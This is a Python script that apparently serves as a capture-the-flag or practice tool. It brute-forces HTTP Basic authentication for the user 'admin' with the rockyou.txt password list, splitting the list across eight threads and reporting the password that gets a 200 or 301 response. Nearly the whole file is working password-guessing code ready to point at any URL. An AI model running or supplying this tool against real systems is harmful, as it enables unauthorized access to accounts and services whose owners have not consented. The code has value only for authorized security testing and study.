from requests import get
import requests
from base64 import b64encode
import sys
import os
import shutil
import threading
import time


class Environnement():
    def __init__(self, tries):
        self.URL = 'http://url' #'http://192.168.1.28'#
        self.USER = 'admin'
        self.PATH = "rockyou.txt"  # Path of password list
        self.TMP_PATH = "./tmp/"  # Created during the runtime -> store the files for each Thread
        self.FAILS, self.ERROR = 0, 0
        self.FLAG = ''
        self.TRIES = tries  # Password number to check : WARNING -> percentage not accurate if too big
        self.FOUND = False
        self.THREAD_NUMBER = 8 # Warning too much thread can be more slower (the computer need to manage them so his capacities are used)
        self.FILES_PATHS = []  # Each thread has his file
        self.ATTEMPT = 0
        self.THREAD_PERCENTAGE = None
        self.INIT_TIME = time.time()

        

# Init our environnement
env = Environnement(100000)

class InfoThread(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
    def run(self):
        connected = False
        searching_info_given = False
        last_percentage = 0
        current_percentage = self.get_percentage()
        while current_percentage<101 or env.FOUND!=True:
            current_percentage = self.get_percentage()
            if last_percentage != current_percentage and current_percentage<101:
                print(f"[INFO] {current_percentage} %")
                last_percentage=current_percentage
            if env.FAILS > 1 and not connected:
                connected = True
                print('[INFO] Connected.')
            elif env.FAILS < 1 and not connected and not searching_info_given:
                print('[INFO] Search connection...')
                searching_info_given = True
            time.sleep(0.001)
    def get_percentage(self):
        return int(float(env.ATTEMPT)*100 / float(env.TRIES))

class BruteForceThread(threading.Thread):
    def __init__(self, path):
        threading.Thread.__init__(self)
        self.path = path
    def run(self):  # path is the file path for the thread using this function. Brute Force basic auth function.
        # print('\n\n   [+] STARTING \'%s\'\n\n' % (env.URL))
        # print(self.path+"\n")
        with open(self.path, 'r') as f:
            for i in range(int(env.TRIES/env.THREAD_NUMBER)):
                if env.FOUND == False:
                    PSW = f.readline().strip()  # Getting password (1 line = 1 password)
                    # Finding base64 of the string user:psw
                    INFO = b64encode(f'{env.USER}:{PSW}'.encode()).decode()
                    env.ATTEMPT += 1
                    try:
                        r = get(env.URL, headers={"Authorization": f"Basic {INFO}"})
                        s = r.status_code  # Answer code. 200 = 0K, 401 = Unauthorized
                        if s == 200 or s == 301:  
                            env.TRIES = i + 1
                            env.FLAG = PSW
                            env.FOUND = True
                            break
                        env.FAILS += 1
                        time.sleep(0.001)
                    except requests.exceptions.ConnectionError as e:
                        print('[WARNING] Connection Pool Error')
                    except Exception as e:  # Catch problem
                        print('[ERROR] SOMETHING WENT WRONG')
                        env.ERROR += 1
                        if env.ERROR > 10:
                            print('[FATAL ERROR] Too much errors.')
                            sys.exit(-1)
                else:
                    f.close()   
            f.close()


def clean_tmp():
    shutil.rmtree("tmp")
    os.mkdir("./tmp")

def print_result():
    print(f'\n\n   [+] END OF PROCESS ({int(time.time()-env.INIT_TIME)} s)\n')
    print('   [FAILS] %s' % (env.FAILS))
    if env.FOUND == True:
        print("\n      > '%s' : '%s' (%s thread tries)" % (env.USER, env.FLAG, env.TRIES))
        print('\n')

# Create for each thread -> his password list
def thread_file_splitting():
    with open(env.PATH, 'r') as f:
        current_number_thread = 0
        data = ""
        for i in range(env.TRIES):
            line = f.readline().strip()
            data += line+"\n"
            # Checking if it's the moment to split (example : if THREAD_NUMBER = 2 and TRIES = 10, we write/split to an other file at i=5 to i=10)
            if (i-1 != 0 and (i-1) % int(env.TRIES/env.THREAD_NUMBER) == 0) or i+1 == env.TRIES:
                new_path = f"{env.TMP_PATH}{str(current_number_thread)}.txt"
                with open(new_path, 'w') as f_tmp:
                    current_number_thread += 1
                    f_tmp.write(data)
                    f_tmp.close()
                env.FILES_PATHS.append(new_path)
                data = ""



if __name__ == '__main__':
    try:
        os.mkdir("./tmp")
    except:
        pass
    
    thread_file_splitting()
    info_thread = InfoThread()
    info_thread.setDaemon(True)
    info_thread.start()

    # the job list 
    jobs = []
    for i in range(env.THREAD_NUMBER):
        thread =  BruteForceThread(f"{env.TMP_PATH}{i}.txt")
        jobs.append(thread)
    try:
        # Start the threads (i.e. brute force with each password list)
        for j in jobs:
            j.start()

        # Ensure all of the threads have finished
        for j in jobs:
            j.join()

        info_thread.join()
    except KeyboardInterrupt:
        print("[STOPPED] Interrupted.")
        env.FOUND = None
    print_result()
    clean_tmp()
